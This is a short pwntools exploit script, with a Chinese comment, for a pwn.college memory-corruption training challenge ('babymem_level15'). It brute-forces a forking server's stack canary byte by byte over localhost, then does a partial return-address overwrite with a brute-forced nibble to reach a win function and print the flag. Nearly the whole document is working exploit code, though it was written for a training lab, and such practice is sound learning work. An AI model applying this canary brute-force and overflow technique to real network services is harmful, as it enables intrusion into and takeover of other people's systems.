# 这题是通过子线程去泄露主线程的canary, 需要一直尝试直到得到真实的canary值

from pwn import *

#context(log_level='debug')
canary = b'\x00'
target = process('./babymem_level15_teaching1')
win = 0x174a#474a

def send_one(payload):
    io = remote('127.0.0.1', 1337)
    io.recvuntil(b'size: ')
    io.sendline(bytes(str(len(payload)), encoding='utf8'))
    io.recvline()
    io.sendline(payload)
    io.close()
    target.recvuntil(b'Goodbye!\n')
    ret = target.recvline()
    if b'Child exiting!' in ret:
        return True
    return False

while True:
    if len(canary)==8:
        break
    for i in range(0xff):
        payload = b'A'*7*8+canary+p8(i)
        if send_one(payload):
            canary += p8(i)
            #print(canary)
            break

print(canary)
for i in range(0xf):
    d = (i<<4)^0x07
    payload = b'A'*7*8+canary+b'B'*8+b'\x4a'+p8(d)
    io = remote('127.0.0.1', 1337)
    io.recvuntil(b'size: ')
    io.sendline(bytes(str(len(payload)), encoding='utf8'))
    io.recvline()
    io.sendline(payload)
    data = target.recvuntil(b'Goodbye!\n')
    if b'pwn_college' in data:
        print(data)
        break
